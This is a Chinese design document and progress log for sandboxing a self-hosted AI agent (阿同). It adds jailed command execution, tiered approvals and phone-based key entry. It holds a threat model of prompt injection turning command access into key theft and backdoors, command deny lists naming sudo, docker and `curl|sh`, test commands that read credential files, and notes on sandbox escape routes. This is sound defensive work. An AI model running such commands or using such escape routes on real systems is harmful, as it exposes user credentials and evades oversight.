# 阿同执行能力 track（HANDS）— 给阿同一双关在监狱里的手，配置动作搬到手机上

> Status: **M0 计划落档 + M1 四档策略纯核 + M2 手 A 原生执行器落地（2026-08-15）**——侦察 +
> 威胁模型 + 四档策略 + 五岔口拍板 + 里程碑 M1→M7；M1 见 §九，M2 见 §十（真 spawn 门全过 +
> Codex 交叉审五轮：5H/4M/1L → 2H/6M/2L → 3H/3M → 3H/3M → 2H/1M/1L，全部修入，见 §10.5）。**M2b 及之后的里程碑都是方向性规划，
> 实现前按 M0 惯例重新细化。**
> Last updated: 2026-08-15
>
> 用户诉求（2026-08-15 原话）：「我们要增强 atong 的执行能力，比如说增加手机可执行
> 命令。理想形态是在服务器里一键镜像完成部署，完成 im 通道后包括配 api-key 这种指令也
> 可以手机用 `/`+xxx 指令配置，拥有自行检测所在环境（根据服务器资源及用户批准决定后续
> 配置方案）、配脚手架能力、增强修复能力。将指令等级升级，涉及到 atong 自身运行基础设施
> 及凭证的文件需要人参与管理至少要确认，其他的分级自行写文件以 obsidian 类似的方式来管理
> 自己的任务和记忆和任务，甚至配开发环境、是否可行？」
>
> 前置：2026-08-14 顶级智能体对标（Manus / OpenAI Agent / Genspark 等）结论——阿同的
> 差距在**执行肢体**（沙箱、浏览器、交付物形态、多小时自治），不在神经系统（记忆 / 治理 /
> 多用户 / 联邦 / IM 原生）。本 track 只补「肢体」里与北极星相容的那一半：**关在监狱里的
> 手 + 手机上的配置面**；浏览器自动化与每任务云 VM 显式不做（见 §七）。

---

## 一、结论先行：可行，且七成是装配

用户问的六件事逐条对到仓里**已经有**的东西（file:line 都是 2026-08-15 一手核）：

| 诉求 | 今天有什么 | 差什么 |
|---|---|---|
| ① 手机 `/` 指令配置 | IM 命令面 `/help /bind /inbox /approve /deny /setting`（`packages/im-adapter/src/command-parser.ts:69-107`，`host/src/im-bridge.ts:319-471`）；`setting` 运维台三入口一个咽喉 `runOpsCommand`（`host/src/ops-core.ts:536-562`），四档 `OpsTier = read \| safe-mutate \| config-write \| destructive-offline`（`:84`），**IM 只开 read+safe-mutate，config-write 在 IM 上刻意 ✗**（`docs/zh/SETTING-OPS-CONSOLE.md:33-60`） | 配 key / 换模型这类 config-write 在手机上的**两步确认**路径；`/setkey` 的凭证录入路径 |
| ② 配 api-key | 三条既有录入路：admin 面板 / `gotong model` 走 `PUT /api/admin/agents/:id`（key 进金库）/ 向导；一次性链接机制先例（`?token=` 固定攻击防御 `web/src/server.ts:1078-1100`、设备配对码 80-bit 单次 10min、IM 绑定 6 位码、邀请令牌只显示一次 `identity-routes.ts:1378,1522`） | 手机端的**凭证录入口**（岔口 2 已拍：保留现方式 + 允许聊天直贴 + 告知优劣） |
| ③ 自行检测环境→按资源和用户批准定方案 | RES track 只读探测→提案→人批准应用（`docs/zh/RES-RESOURCE-ADAPTATION.md:27-56`，`applicable` 两态、apply 走 admin 路由）；`detectFsJail` 功能性探针（`core/src/workspace-jail-detect.ts:64`）；SEN `my_status`/`hub_health` | 探测面从「LLM 资源」推广到「机器资源 + 工具链」；方案应用走分级闸 |
| ④ 配脚手架 / 配开发环境 | 文件系统监狱纯核 `wrapWithFsJail`（`core/src/workspace-jail.ts:246`，bwrap/sandbox-exec 两内核，`buildBwrapArgs` `:299`：`--ro-bind / /`、`--tmpfs /tmp`、可写根逐个 `--bind`）；两个消费者 = `cli-agent/src/cli-runner.ts:102`、`acp-agent/src/acp-session.ts:428` | **阿同自己没有手**——没有任何工具能在监狱里跑命令 / 写工作区；监狱今天只护外驱 CLI agent |
| ⑤ 增强修复能力 | 诊断闭环 BE-M4、`fix-dirs`/`cold-start` 运维命令、AFR 医生卡、RES apply | 「能诊断」到「能动手修」之间缺分级的修复动作目录 |
| ⑥ 指令分级：基础设施/凭证文件人参与、其余自行写 | 治理闸 `GovernedActionToolset` 服务端权威 allow/approve/refuse，`classify` 可注入（`personal-butler/src/governed-toolset.ts:54,90-95,146`）；IMA 手机可批白名单按名字形状 fail-closed（`host/src/personal-butler-escalation.ts:89-96`）；LIB 知识树 `.md` 已是 Obsidian 可直接打开的目录（`knowledge/`，200 文件/32KB/4MB/6 深） | 一张**统一的写目标/命令四档表**把散落的分级（OpsTier / governed / IMA）收成一个策略；Obsidian 投影层 |
| 一键镜像部署 | `Dockerfile` + `docker-compose.yml`（env `:43`）+ `docker-compose.prod.yml`（`:67,:146`）+ `deploy/`（Caddyfile / systemd / watchdog / cloud-quickstart） | IM token 作为部署期 env 一次到位（手机优先的鸡生蛋）；e2e 门 |

**判定**：真正要新造的只有三件——(a) 关在监狱里的手（工具面 + 上限 + opt-in），(b) 统一四档策略
（一个纯核，所有写/执行动作都问它），(c) 手机端凭证录入路径 + config-write 两步确认。其余是把
既有件按同一张表接线。

---

## 二、五岔口拍板记录（2026-08-15，用户原话「1=两者；2=保留目前方式，允许聊天直贴，告知用户两种方式优劣；3=每次park；4=md 投影层、JSON 仍是真相；5=hub 同机监狱」）

| # | 岔口 | 拍板 | 落地含义 |
|---|---|---|---|
| 1 | 手的形态：原生确定性执行工具（阿同做脑） vs 外驱 CLI coding agent（cli-agent 五缝） | **两者** | M2 先做原生手（零新依赖、阿同直接用）；M2b 把 Claude Code / Codex / Aider 经 `@gotong/cli-agent` 接成兄弟参与者干重活，**共用同一个成员工作区**，阿同经 escalate 同型转派 |
| 2 | api-key 录入：只走网页/一次性链接 vs 允许 IM 直贴 | **保留目前方式，允许聊天直贴，告知优劣** | `/setkey` 双路径：(a) 直贴 `/setkey <目标> <key>`；(b) `/setkey link` 出一次性链接。**每次回复都附优劣文案**（直贴=快、零跳转，但 IM 平台服务器可见你的 key 且聊天记录留底；链接=key 只走 TLS 到你自己的 hub，平台看不见，多一步跳转） |
| 3 | 阿同自身基础设施（tier 2）动作：每次 park vs 项目级一次授权 | **每次 park** | tier 2 动作一律 approve，无 blanket grant；批准走 IMA 手机短码（hub 内配置动作本就 `imApprovable`） |
| 4 | Obsidian：重写记忆引擎成 md 库 vs md 投影 | **md 投影层，JSON 仍是真相** | tasks.json / semantic.jsonl 等真相不动；投影 `tasks.md`、`memory/*.md`（frontmatter + `[[wikilink]]` 指知识笔记），标「自动生成，改了会被覆盖」 |
| 5 | 执行位置：hub 同机监狱 vs 独立容器/云 VM | **hub 同机监狱** | 复用 `wrapWithFsJail`（bwrap / sandbox-exec），可写根=成员工作区 + tmp，`<space>/` 配置区**结构性不在可写根**；监狱缺席=手不装（fail-closed） |

---

## 三、威胁模型：为什么「手」必须先关起来

阿同是被注入面最宽的参与者：IM 消息、搜索结果、信封 payload、连接器返回、群聊里别人的话
全是 observed content，都能进它的上下文。今天最坏后果是「park 一个坏动作等人批」；一旦给它
`run_command`，**注入即 RCE**：读 vault / 外传 key / 装后门 / 填盘 / 挖矿。四道防线缺一不可：

1. **监狱**（结构性）：可写根只有成员工作区（`<space>/butler/hands/user/<userId>/workspace/`，
   `assertSafeOwnerId` 先于任何拼接）与 tmpfs；`<space>/`（agents.json / vault / 钥 / gotong.env /
   identity.sqlite）以只读 bind 进监狱**都不行**——它们含凭证，读了就等于泄。故 M2 监狱 **不 bind
   `<space>`**（bwrap `--ro-bind / /` 是全盘只读——`<space>` 在盘上，须显式 `--tmpfs` 盖掉或改成
   最小可读根白名单；M2 细化时以「进程 `cat <space>/gotong.env` 必须失败」为门）。网络默认
   `--unshare-net`（`buildBwrapArgs` 今天不隔网，`:276` 注释「network, and exec stay allowed」是给
   外驱 coding agent 留的——**手 A 的默认与之相反**）。
2. **四档策略**（服务端权威，fail-closed）：见 §四。未知一律不 allow。
3. **凭证结构性缺席**：阿同没有任何工具能读/写凭证**值**（只见名字/槽位/有无）；`/setkey` 直贴
   由桥层截获直接进金库，**不进阿同上下文、不进 SESS 会话窗、不进 transcript**，回复不回显。
4. **审计 + 上限**：每次执行落审计行（argv/cwd/出码/时长/字节数，不落 stdout 全文）；单命令
   时长 ≤120s、输出尾巴 ≤32KB、工作区总量 ≤512MB、并发 1/成员；超限响亮拒。

**残余（如实）**：监狱内资源滥用靠上限兜（bwrap 不做 cgroup）；bwrap 依赖非特权 userns
（Ubuntu 23.10+ 默认 AppArmor 限制非特权 userns，部署时可能要 `sysctl
kernel.apparmor_restrict_unprivileged_userns=0` 或 setuid bwrap——M2 探针须能诊断并说人话）；
macOS `sandbox-exec` 已弃用但可用；hub 非 root ⇒ `apt`/`systemctl` 结构性做不了（这是**特性**：
系统级动作留给人，阿同只能「指路」）。

---

## 四、设计

### 4.1 统一四档表（所有写目标 / 命令都问同一个策略）

| 档 | 对象 | 判定 | 谁批 | 说明 |
|---|---|---|---|---|
| **0 自留地** | 知识树 `knowledge/`、面板内容、任务笔记本、记忆、Obsidian 投影 | allow（经**各自既有工具**） | 无 | 只写本人展示/自用数据；**JSON 真相文件只经各自工具写**（TN/记忆的 schema、上限、id 保证都在工具里），raw 文件写这些路径 = refuse |
| **1 工作区** | 成员工作区内 `hands_write/read/list/rm`；监狱内 `hands_run`（**断网**） | allow | 无 | 装脚手架 / 写脚本 / 跑测试 / 建项目；监狱 + 上限兜底 |
| **2 阿同自身运行基础设施** | 联网执行（装依赖/拉代码）、`setting` config-write（`config-set/config-price`）、建改 agent/工作流（既有 governed 工具）、RES 方案应用、桥重连、模板安装 | approve（**每次 park**） | 本人（IM 短码 `/approve` 或 /me） | 走**类型化动作**不走 raw 文件写：agents.json / workflows/ 有校验器在工具里，raw 写它们 = refuse + 指路 |
| **3 凭证材料** | vault / master key / 签名钥 / bot token / gotong.env 值 / identity 库 / systemd unit / Caddyfile | refuse（结构性缺席 + 分类兜底） | 人亲手（`/setkey` 双路径 / 网页 / CLI） | 阿同只能「声明需要哪个变量名」（`request_env_var(NAME)` 出一张给人的卡），值永不经它 |

判定纯函数 `classifyHandsAction(action, ctx) → {tier, verdict:'allow'|'approve'|'refuse', reason}`
（`packages/personal-butler/src/hands-policy.ts`，host-free）：`write` 看解析后的绝对路径是否在
工作区内（`isInsideRoots` 同型，realpath 防符号链接逃逸）；`run` 看 `net` 标志（false→1，
true→2）+ 一小张 argv 前缀拒绝表（`sudo su apt apt-get systemctl docker mount` 与 `curl|sh`
形状——**做不了或不该做的直接拒，别浪费一次审批**）；其余一律按 fail-closed 落保守侧。
`verdict` 直接喂 `GovernedActionToolset.classify` 缝（`governed-toolset.ts:90`）。

### 4.2 手 A：原生确定性执行工具（M2）

`buildButlerHandsToolset({userId, hands})`（host `personal-butler-hands.ts`，AFR 注册三件套）：
`hands_run {argv, cwd?, stdin?, timeoutSec?, net?}` / `hands_write {path, content}` /
`hands_read {path}` / `hands_list {path?}` / `hands_rm {path}`。全部相对成员工作区
`<space>/butler/hands/user/<userId>/workspace/` 解析（`ownerDir` 先 `assertSafeOwnerId`）；
执行 = `wrapWithFsJail({writableRoots:[workspace], cwd, hardening:{unshareNet:!net, unsharePid:true,
hiddenPaths:[<space>, hub 用户 HOME, /home, /root, /run/user…], hiddenFiles:[/etc/gotong.env, docker/
podman 套接字…], readOnlyRoots:[落在 HOME 里的 node 前缀…], denySharedTmp:true}})` → spawn（**已落地
形状**：藏起来的树在监狱里「不存在」——bwrap `--tmpfs` 盖掉后再 `--bind` 工作区回去、`--ro-bind` 再放
开只读的工具链、末尾 `--remount-ro`；seatbelt `deny file-read* file-write* (subpath …)` 再重放行工作
区/只读根，后规则赢——见 §十）。**文件四动作也在同一座监狱里做**（监狱内的 node 小助手），hub 进程
自己从不以自己的权限碰工作区字节。
监狱探针 `detectFsJail` 结果 `kind:'none'` ⇒ **整套手不装**（fail-closed，B1 能力清单如实不列），
`my_status` 多一行「手：已装(bwrap)/未装(原因)」。opt-in file-first `<space>/hands.json`
`{enabled:true, maxRunSec?, maxOutputBytes?, maxWorkspaceBytes?, hidden?:[绝对路径], readOnly?:[绝对路径]}`
（apns.json/fcm.json 同族三态
合同：缺席 OFF 字节不变 / 形状不对（坏 JSON、未知键、越界数值——区间 `HANDS_CONFIG_BOUNDS`
1–3600s / 1KB–1MB / 1MB–16GB，越界**不 clamp** 直接不装）warn+OFF / `enabled:false` info+OFF /
开了但监狱缺席 boot warn+OFF 并说明装法），**零新旋钮（116 冻结）**。审计行 + 每命令回执给
模型只带出码/尾巴/字节数。

### 4.3 手 B：外驱 CLI coding agent（M2b，opt-in）

owner 用既有 `@gotong/cli-agent` 把 Claude Code / Codex / Aider 接成兄弟参与者
（`docs/zh/ledger/V5-E2-CLI-ADAPTER.md` 五缝 + 动作闸），**可写根指到同一个成员工作区**（阿同写
需求文件、coder 改代码、阿同跑测试验收——文件就是接口）；阿同经 `escalate_to_expert` 同型
fire-and-forget 转派（`personal-butler-escalate.ts:118` explicit 直达），结果 pushToMember 推回。
需要机器上有该 CLI 及**用户自己的** key（M3 `/setkey` 也能录）；没有=不装。

### 4.4 手机配置面（M3）

- **`/setkey`**：`/setkey <provider|agentId> <key>` 直贴（桥层截获 → 金库，与 admin API 同一写入
  服务；回复固定「已存入 · 请手动删除刚才那条消息」+ 优劣文案，平台支持时 best-effort 撤回原消
  息）/ `/setkey link` 出单次 10min 链接（设备配对码同族：`hands_credential_codes` 单用户单码，
  链接打开极简页 POST key + token，**不建会话**）。**发送方必须是绑定了 owner/admin 用户的 IM 身份**
  （im_bindings → userId → role），否则同 IM 命令面其他门一样「未启用」。
- **config-write 上手机 = 两步确认**：`/model set <agent> <model>`、`/setting config-set K V`
  等先回「将改 X→Y，回 `/approve <短码>` 确认」，短码走 IMA 同一 pending 面；`destructive-offline`
  仍 CLI-only。这是对 `SETTING-OPS-CONSOLE` 表「config-write ✗ IM」的**显式改口**——当年 ✗ 的理由
  是 IM 单步无确认，两步确认后理由消失；文档同刀改。
- **`/keys`** 列 key 有无（名字/槽位/有无/最后测试结果），永不列值。

### 4.5 环境探测 → 部署方案 → 人批（M4）

零 LLM 探针（cpu/mem/disk/node/ffmpeg/bwrap 或 sandbox-exec/docker/GPU/出网可达）折成
`hub_environment` benign 工具 + RES 同型**提案卡**（每条 `applicable` 两态：可自动应用的走 tier 2
approve，不能的写「你要做什么」指路）。典型：内存 <4GB ⇒ 建议关 embedder/单管家；无 ffmpeg ⇒
语音腿不可用 + 装法；无监狱 ⇒ 手不可用 + 装法；无出网 ⇒ 搜索/推送退化。**探针每轮零 LLM，
方案由阿同渲染，应用经闸**。

### 4.6 Obsidian 投影（M5）

`<ownerDir>/` 本就可被 Obsidian 当 vault 打开（`knowledge/` 是 md 树）。补三块只读投影：
`tasks.md`（从 tasks.json，含 `[[knowledge/...]]` 链）/ `memory/<tier>.md`（事实摘要 + 出处）/
`STATUS.md` 已在。生成时机=各自写路径末尾 + 6h 维护兜底；frontmatter `generated: true`；
真相仍 JSON，投影被人改了下次覆盖（并在 STATUS 里提一句）。零 LLM。

### 4.7 一键镜像（M6）与修复接手（M7）

M6：compose 加 IM token / provider key 的部署期 env 透传（`GOTONG_TELEGRAM_BOT_TOKEN` /
`GOTONG_LARK_*` / `GOTONG_WECHAT_BOT_TOKEN` 既有旋钮，零新增），一次 `docker compose up` 后
IM 通道即在；**至少一次网页触碰不可避免也不该避免**（owner 设密 + `/bind` 出码 = 身份锚），此后
配置全在手机。镜像发布到 GHCR = 用户门。M7：修复动作目录按四档挂——`fix-dirs`/清缓存(1) /
重拉桥、重连 MCP、应用 RES 提案(2) / 「换钥/改 unit」指路人(3)；AFR-M5 面包屑在失败分支多一句
「阿同能修的直接提议修」。

---

## 五、五条不可破边界

1. **手在监狱里，配置区结构性不在可写根；监狱缺席=手不装。** 绝不「没监狱先裸跑将来再关」。
2. **分级服务端权威、fail-closed。** 未知路径/未知形状永不 allow；JSON 真相文件只经各自工具写；
   tier 2 每次 park（岔口 3）。
3. **凭证值结构性不经阿同。** `/setkey` 直贴由桥层截获，不进上下文/会话窗/transcript，不回显；
   双路径每次附优劣文案；阿同只能声明变量名。
4. **opt-in file-first `<space>/hands.json`，未装字节不变，零新旋钮（116 冻结）。**
5. **北极星不动**：hub 不跑 LLM（手是阿同这个参与者的工具，探针零 LLM）；人和 agent 同一
   Participant（手 B 是兄弟参与者不是特权后门）；file-first；内核除 `workspace-jail` 加可选
   `unshareNet`（additive，既有调用者字节不变）外零改动。

---

## 六、里程碑

| # | 里程碑 | 交付 | 会红的门 |
|---|---|---|---|
| M0 | 本文 | 侦察 + 威胁模型 + 四档表 + 五岔口 | — |
| M1 | 四档策略纯核 | `personal-butler/src/hands-policy.ts` 纯函数 + 拒绝表 + realpath 逃逸判定 | 单测：配置区/凭证路径永不 allow；符号链接逃逸 refuse；`net:true`→approve；未知→非 allow；拒绝表命中 refuse |
| M2 ✅ | 手 A 原生（2026-08-15，见 §十） | host `personal-butler-hands.ts` 执行器 + 五工具（**文件四动作走监狱内 node 小助手**）+ `hands.json` opt-in（含 `hidden`/`readOnly` 追加清单）+ core `FsJailHardening`（`unshareNet`/`unsharePid`/`hiddenPaths`/`hiddenFiles`/`readOnlyRoots`/`denySharedTmp`，additive；seatbelt 侧 `unsharePid` 映射成进程隔离规则）+ 上限（含监狱内 `ulimit`）+ 审计（含 stdin 摘要/sha256）+ factory 接线 + AFR 三件套 + main.ts 棘轮显式抬（2768/2770→2772/2780）+ 备份排除工作区 `node_modules` | 真 spawn 门（本机 sandbox-exec 68 例全过，bwrap 靠 argv 单测）：`cat <space>/gotong.env` 在监狱内失败；写 `<space>/agents.json` 双拒（监狱 rc≠0 且字节不变 + hands_write 穿越 refuse）；hub 用户 HOME 与点名文件藏起来；策略放行后目录换成指向 `<space>` 的链接小助手照样写不进读不出（TOCTOU 真闸=监狱）；断网命令联本机 HTTP 失败、`net:true` approve 后成功；超时/超输出/洪水响亮；命令退出即收整个进程组；hub 级并发 1 响亮拒；`kind:'none'` 整套不装；缺席字节不变（脸 absent≡off≡armed−hands_*）；子环境零凭证且 TMPDIR 指进工作区；审计不落正文；**Codex 交叉审五轮**（5H/4M/1L → 2H/6M/2L → 3H/3M → 3H/3M → 2H/1M/1L 全部修入，§10.5）✅ |
| M2b | 手 B 外驱 | cli-agent 参与者 + 共用工作区 + escalate 转派配方 + docs | e2e：阿同写需求→coder 改文件→阿同 `hands_run` 跑测试 |
| M3 | 手机配置面 | `/setkey` 双路径 + 一次性链接 + 优劣文案 + config-write 两步确认 + `/keys` + SETTING-OPS-CONSOLE 改口 | 单测：直贴不进 SESS 窗/transcript、不回显；非 owner/admin 绑定拒；链接单次 10min；两步确认走 IMA；**Codex 交叉审** |
| M4 | 环境探测→方案→人批 | `hub_environment` + 提案卡 + tier 2 应用 | 探针零 LLM；不可应用项只指路 |
| M5 | Obsidian 投影 | tasks.md / memory/*.md 生成 + frontmatter + 覆盖语义 | 真相未动；投影可 Obsidian 解析 |
| M6 | 一键镜像 e2e | compose env 透传 + e2e 脚本 | `compose up` → IM 在 → 网页一次触碰 → 手机 `/setkey`→`/model` 全通 |
| M7 | 修复接手 + capstone | 修复动作目录 + `examples/atong-hands` 四幕（注入写配置双拒 / 联网 park 批后跑 / 工作区直写+监狱跑脚本 / `/setkey` 双路径文案 + 金库落值零回显） + 收口 | `pnpm demo:atong-hands` exit 0，零 key 零 LLM |

顺序按用户优先级：**M1→M2（手）→M3（手机）**先，M4/M7 次之，M5/M6 后置；M2b 在 M2 后按需。
每刀：新单测 + 四门 PASS（旋钮 116）+ 一刀一 commit；M2/M3 必过 Codex 交叉审。

---

## 七、显式不做

- 每任务云 VM / 独立容器（岔口 5 已拍同机监狱；行业形态在，但撞轻量与自托管）。
- 浏览器自动化 / computer use（独立 AI 浏览器形态 2026-08 已被行业判死；若要走 MCP 浏览器连接器
  另起 track，且仍在闸后）。
- 阿同自注册账号 / 自取 key / 自管凭证值（LSA-M0 立场不变：发现+建议，人录入）。
- 自动转发凭证、blanket grant、root 级动作（apt/systemctl）——结构性做不了，也不该做。
- 子代理 swarm / 多小时无人自治（一消息一任务 ≤16 轮不动；长活走工作流 + 定时）。

---

## 八、验收纪律

`packages/*` 只动 personal-butler（策略）/ host（执行器、桥命令、投影）/ core（`unshareNet` 一处
additive）；四门 PASS 全程；每个新 builder 过 AFR 注册三件套（tiers 名单 / toolface tripwire /
门）；真机 round-trip 以「盘上产物 + 审计行」为准；安全承重刀（M2/M3）Codex 交叉审后才 commit
收口。

---

## 九、M1 落地记录（2026-08-15）

`packages/personal-butler/src/hands-policy.ts`（host-free 纯核，30 单测）：

- **形状**：`classifyHandsAction(action, ctx) → {tier, verdict, code, resolvedPath?, net?}`，`verdict`
  直接是 `GovernedVerdict`；`handsGovernedClassifier(ctx)` 是给 `GovernedActionToolset.classify` 的
  适配器（`(name, args) → verdict`，未知名/坏形状 → refuse）；`classifyHandsToolCall` 给执行器用（多回
  `resolvedPath`/`net`）；`resolveWorkspacePath` 单独导出——**M2 执行器每次文件操作都必须过它**，且用
  它回的绝对路径，绝不重新解析模型给的串。`HANDS_LIMITS`（120s/32KB/512MB/1024 字符/256 argv/8KB
  参数/1MB 写/256KB 读/并发 1）是唯一真相，执行器只执行不另定。
- **文件动作**：形状门（绝对路径/`~`/反斜杠/控制字节/空/超长 → `path_invalid`）→ 词法 `isInsideRoots`
  （复用 core，`..` → `path_escape`）→ **realpath 锚定**（最深存在祖先 realpath + 未存在尾巴回接，
  结果仍须在根内；指向外的符号链接目录/文件 → `path_escape`）→ **变更动作拒经符号链接终点**（write/rm
  遇终点是链接一律 `path_symlink`，**悬空链接也拒**——否则 `writeFile` 会顺着悬空链接在工作区外「创建
  穿透」）。指回工作区内的链接照常可读（pnpm `node_modules/.pnpm` 布局依赖这点）。根自身按 realpath
  比（macOS `/tmp`→`/private/tmp` 那类不匹配不会把整个工作区误拒）。探针抛异常 → refuse 绝不 allow。
- **执行动作**：argv 形状门（空/非串/>256 项/单项 >8KB/含 `\t\n\r` 以外控制字节 → `run_invalid`）→
  **拒绝表按 argv[0] basename**（sudo/su/doas/pkexec · apt/dpkg/yum/dnf/apk/pacman/brew/snap ·
  systemctl/service/systemd-run/reboot… · docker/podman/bwrap/sandbox-exec/unshare/nsenter/chroot/
  mount · crontab/at/launchctl · osascript/open/xdg-open → `run_forbidden` tier 3，全路径与大小写
  照抓）→ cwd 过同一解析器 → **`net` 决定 1/2 档**：`net:true` 或按表推断为联网（curl/wget/ssh/
  scp/rsync/gh 恒联网；git clone/fetch/pull/push/ls-remote/submodule；npm/pnpm/yarn install|add|ci|
  update|publish|audit|…；pip/uv/poetry/cargo/go/gem/bundle/composer 装包类）→ tier 2 approve，理由
  带命令名与「按命令推断」；否则 tier 1 allow。**推断只是 UX**：推错的命令在断网监狱里失败一次，模型
  加 `net:true` 重来（那才是审批点）；`npx`/`pnpm dlx` 刻意不列（开发区多跑本地 bin，逢用必批太吵）；
  显式 `net:false` 赢过推断（离线跑无害）。**解释器/shell 不 park**——与 layer-1 `jailArgv` 相反，
  因为手 A 有 layer-2 内核监狱兜底。
- **变异测试三门全红**（去掉终点链接拒 → 2 例红；去掉 realpath 越界拒 → 3 例红；关掉联网推断 → 3 例
  红），复原 byte-identical。四门 PASS（旋钮 116 零新增）；personal-butler 184（+30）。

**M1 期间钉下的 M2 前置备忘**（写在这里免得实现时忘）：
1. TOCTOU：hub 进程做文件操作，监狱内子进程理论上可在检查与写之间把目录换成链接。M2 靠三件缩窗：
   每成员并发 1 + 每次 `hands_run` 结束即杀整个进程树（Linux 补 `--unshare-pid`——`--die-with-parent`
   `buildBwrapArgs` 已有——使后台进程活不过一次运行；macOS 无 pid 命名空间，`setsid` 双 fork 的守护
   进程是**如实残余**）+
   写文件用 `O_NOFOLLOW`（终点原子拒链接；祖先目录换链接仍是残余，Node 无 `openat`）。
2. `--ro-bind / /` 会让 `<space>` 在监狱内可读——M2 必须 `--tmpfs <space>` 盖掉再把工作区 bind
   回去（bind 按顺序处理，后者盖前者），门=监狱内 `cat <space>/gotong.env` 失败；macOS seatbelt
   profile 要补 `(deny file-read* (subpath "<space>"))` 例外工作区 + `(deny network*)`（当前
   `buildSeatbeltProfile` 只限写不限读不限网）。
3. `unshareNet` 与上面两条都是 `wrapWithFsJail` 的可选新参数（additive，既有 cli-agent/acp-agent
   调用者字节不变）；这是本 track 唯一的 core 触碰。
4. 备份：`gotong backup` 会把工作区（可能含 `node_modules`）打进档案——M2 决定是否排除
   `butler/hands/**/workspace/node_modules`（倾向排除并在档案 note 里写明）。

---

## 十、M2 落地记录（2026-08-15）

`packages/host/src/personal-butler-hands.ts`（约 1300 行）+ core `FsJailHardening`（additive 六键）+
factory/self-status/capabilities/main.ts 接线 + cli 备份排除；host 承重门
`tests/personal-butler-hands.test.ts` **68 例**（其中 22 例在真 OS 监狱里 spawn——文件四工具也在这
一层），core `workspace-jail-os.test.ts` **33 例**，另有共享审批文案的 `approval-text.test.ts` **14 例**
与跨入口的 `approval-copy-shared.test.ts`。**Codex 交叉审五轮**（§10.5）：每一轮都是对**上一轮修完的
代码**再审，前四轮的结论都是「修了再提交」——5H/4M/1L → 2H/6M/2L → 3H/3M → 3H/3M → 2H/1M/1L，
全部修入。其中两条是**前一轮的修法自己引入的**（二轮 S1：藏 HOME 会把 HOME 下的工作区一起盖掉；
五轮 H1：四轮把写进去的那行字修对了，读出来那行仍在硬截断），这正是多轮审的价值所在。

### 10.1 形状（与 §4.2 一致，这里只记「为什么这样」）

- **一个 `GovernedActionToolset` 挂五工具**，`classify` = M1 `classifyHandsToolCall` 原样（tier 2 联网
  命令在 park 前先查工作区配额——满了当场 refuse，**绝不浪费一次审批**）；`execute` **每次重跑同一份
  策略**拿 `resolvedPath/net`（refuse 只回 isError **绝不重新 park**——park 的裁决权只在 classify）。
  工具描述里把边界说给模型听（「命令看不到 hub 的配置与凭证，家目录整个不可见」「不能 sudo/装系统包
  /管服务」）——模型早知道做不了的事，就少一次白跑。给模型看的**错误文本把 hub 绝对路径换成
  `<space>`/`<workspace>` 占位**（路径本身就是布局情报；成功文本只含相对路径）。
- **构造零副作用**：工作区目录第一次用到才建（装了手但成员从没伸手，盘上零痕迹）；`armButlerHands`
  在 `hands.json` 缺席时**不探监狱、不建目录、不打日志**（缺席 = 与今天逐字节一致，门钉死）。
- **藏什么（`jailShapeFor`，arm 时算一次，hub 级事实）**：`hiddenPaths` = `<space>` + **hub 用户 HOME**
  + `/home` + `/root` + `/run/user`（存在的才盖——bwrap 要有挂载点）+ `hands.json` `hidden` 追加的目录；
  `hiddenFiles` = `/etc/gotong.env`（runbook 默认 EnvironmentFile）+ docker/podman 套接字（存在才盖）+
  `hidden` 追加的文件；`readOnlyRoots` = **落在藏起来目录里的 node 前缀**（nvm 装在 HOME 时——文件小
  助手与成员的 `node` 都要它；前缀是公共工具链不是私产）+ `readOnly` 追加的；HOME 是 `/` 或探不到
  就不藏（盖住根等于焊死监狱）。首版只藏 `<space>` 是 Codex 首轮 H1：生产 `gotong.env` 就在 hub 用户
  HOME 下（`/home/ubuntu/aipehub/gotong.env`），`~/.ssh`/`~/.netrc`/`~/.npmrc` 同理，「凭证结构性缺席」
  只对 `<space>` 成立是半句话。
- **`hiddenPaths` 是承重件不是锦上添花**：seatbelt 的 `MAC_ESSENTIAL_WRITABLE` 含 `/var/folders`（进程
  要活着必需的临时区），而测试/开发环境的 `<space>` 就住在 tmpdir 下——变异测试证实**去掉 `hiddenPaths`
  后监狱内 `echo pwned > <space>/agents.json` 会成功**（essential-writable 放行了它）；有了后置的
  `deny (subpath <space>)`（SBPL 后规则赢）才真的写不进、读不出。bwrap 侧同理：`--ro-bind / /` 让
  `<space>` 可读，必须 `--tmpfs <space>` 盖掉再把工作区 `--bind` 回去（bwrap 按 argv 顺序挂载，**顺序即
  语义**：tmpfs 藏 → ro-bind 再放开只读 → bind 工作区 → ro-bind /dev/null 盖点名文件 → remount-ro）。
  `denySharedTmp` 把 `/tmp` `/private/tmp` `/var/folders` 从 seatbelt 可写根里拿掉（bwrap 本就是私有
  tmpfs `/tmp`），子进程 `TMPDIR=<workspace>/.hands-tmp`（监狱内的 shell 前奏一级 `mkdir`，hub 自己
  一个字节不写）——共享 /tmp 是同机其他进程的通道，也是 macOS 上 seatbelt 藏不住的空档。`hardening`
  刻意**不进 `FsJailSpec`**——cli-agent/acp-agent 按名拷字段，塞进去会被静默丢；手 B（M2b）需要时显式穿。
- **seatbelt 侧 `unsharePid` 不再是空转**：映射成 `(deny signal)(allow signal (target same-sandbox))
  (deny process-info*)(allow process-info* (target same-sandbox))(deny lsopen)(deny appleevent-send)`——
  真机探针钉的（`(deny signal (target others))` 这种写法**静默无效**，只有无过滤 deny + same-sandbox
  allow 才挡得住 `kill <hub pid>`；`open -g -a` 在基线 seatbelt 里**能**经 LaunchServices 在监狱外起
  进程，`(deny lsopen)` 才关上；`osascript` AppleEvents 由 `(deny appleevent-send)` 关）。首版这里是
  Codex 首轮 H2（macOS 无 pid 命名空间，`unsharePid` 一度只是 bwrap 的事）。
- **子进程环境从零拼**（`childEnv`）：PATH（**arm 时过滤过的那份**：只留绝对路径、去重、剔掉落在藏起来
  目录里的项——再放开的除外——并把 node 自己的 bin 补在最前）/HOME=工作区/TMPDIR=工作区/.hands-tmp/
  LANG/TERM/NO_COLOR + 标记 `ATONG_HANDS=1`（给监狱里脚本认「我在阿同手里」；**刻意不带 `GOTONG_`
  前缀**——那是 hub 旋钮的姓，env-registry 门按前缀清点 116 冻结，一个不是旋钮的名字不该占旋钮的额；
  首版叫 `GOTONG_HANDS` 被门抓成 121≠120 才改）；只有 `net:true` 才放行 `HTTP(S)_PROXY/NO_PROXY`，
  **且 URL 里带 `user:pass@` 的代理不放**（那也是凭证；Codex 首轮 M）。绝不 `...process.env`——hub 进程
  里的 `*_API_KEY`/主钥/IM token 结构性到不了监狱（门：监狱内 `env` 输出零 `HANDS_TEST_SECRET`）。
